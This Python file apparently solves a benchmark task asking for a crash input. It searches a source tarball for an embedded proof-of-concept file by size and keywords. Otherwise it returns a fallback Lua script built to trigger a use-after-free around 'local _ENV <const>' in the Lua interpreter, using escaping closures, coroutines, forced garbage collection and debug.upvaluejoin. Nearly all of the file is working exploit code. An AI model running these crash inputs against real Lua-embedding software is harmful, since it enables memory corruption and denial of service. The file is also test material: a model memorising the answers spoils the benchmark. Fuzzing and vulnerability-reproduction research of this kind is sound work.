import tarfile


class Solution:
    def _extract_embedded_poc(self, src_path: str) -> bytes | None:
        L_G = 1181
        best_data = None
        best_score = -1.0
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return None
        with tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                size = m.size
                if size <= 0:
                    continue
                name_lower = m.name.lower()

                is_lua = name_lower.endswith(".lua")
                is_txt = name_lower.endswith(".txt")
                looks_poc_name = (
                    "poc" in name_lower
                    or "uaf" in name_lower
                    or "use_after_free" in name_lower
                    or "use-after-free" in name_lower
                    or "env" in name_lower
                )

                if not (is_lua or is_txt or looks_poc_name or size == L_G):
                    continue
                if size > 200_000 and size != L_G:
                    continue

                try:
                    f = tf.extractfile(m)
                except Exception:
                    continue
                if f is None:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                if not data:
                    continue

                try:
                    text = data.decode("utf-8", errors="ignore")
                except Exception:
                    text = ""

                score = 0.0
                if size == L_G:
                    score += 5.0
                if is_lua:
                    score += 2.0
                if "_ENV" in text:
                    score += 2.5
                if "<const>" in text:
                    score += 2.5
                tl = text.lower()
                if "use after free" in tl or "heap-use-after-free" in tl or "heap use after free" in tl:
                    score += 3.0
                if "addresssanitizer" in text:
                    score -= 2.0

                size_diff = abs(size - L_G)
                score += max(0.0, 2.0 - (size_diff / 1000.0))

                if score > best_score:
                    best_score = score
                    best_data = data

        if best_data is not None and best_score >= 4.0:
            return best_data
        return None

    def _fallback_poc(self) -> bytes:
        lua = r'''
-- Fallback PoC for Lua _ENV <const> issue.
-- Tries several patterns that stress the compiler/runtime around const _ENV.

local function try_run(f)
  local ok, err = pcall(f)
  -- swallow all Lua-level errors; we rely on sanitizer-detected crashes
end

-- Pattern 1: closures escaping scope with local _ENV <const>
try_run(function()
  local holders = {}
  for i = 1, 40 do
    do
      local tag = {}
      local _ENV <const> = { v = i, tag = tag, print = print }
      local function worker(n)
        local s = 0
        for j = 1, n do
          s = s + v + j
        end
        if s == -1 then
          -- never reached; keeps references alive
          print(tag)
        end
        return s
      end
      holders[#holders + 1] = worker
    end
  end
  collectgarbage("collect")
  for i = 1, #holders do
    holders[i](4)
  end
end)

-- Pattern 2: nested functions and recycled locals with _ENV <const>
try_run(function()
  local function make_adder()
    local _ENV <const> = { x = 0 }
    local function add()
      x = x + 1
      return x
    end
    local function wrap()
      return add()
    end
    return wrap
  end

  local fs = {}
  for i = 1, 25 do
    fs[i] = make_adder()
  end
  collectgarbage("collect")
  for i = 1, #fs do
    fs[i]()
  end
end)

-- Pattern 3: coroutines capturing _ENV <const>
try_run(function()
  local function make_coro(idx)
    return coroutine.create(function()
      local _ENV <const> = { k = idx }
      for i = 1, 5 do
        coroutine.yield(k + i)
      end
    end)
  end

  local cos = {}
  for i = 1, 20 do
    cos[i] = make_coro(i)
  end
  collectgarbage("collect")
  for i = 1, #cos do
    local co = cos[i]
    for _ = 1, 3 do
      local ok = coroutine.resume(co)
      if not ok then
        break
      end
    end
  end
end)

-- Pattern 4: debug upvalue manipulation with const _ENV when debug lib is available
if debug and debug.getupvalue and debug.upvaluejoin then
  try_run(function()
    local function outer()
      local _ENV <const> = { a = 1, b = 2 }
      local function f()
        return a + b
      end
      local function g()
        return a
      end
      return f, g
    end

    local f, g = outer()

    local function dummy()
      local x = 10
      return x
    end

    -- Try to confuse upvalues; exact indices may not matter, errors are ignored
    pcall(function()
      debug.upvaluejoin(dummy, 1, f, 1)
      debug.upvaluejoin(dummy, 1, g, 1)
    end)

    collectgarbage("collect")
    pcall(f)
    pcall(g)
  end)
end
'''
        return lua.encode("utf-8")

    def solve(self, src_path: str) -> bytes:
        poc = self._extract_embedded_poc(src_path)
        if poc is not None:
            return poc
        return self._fallback_poc()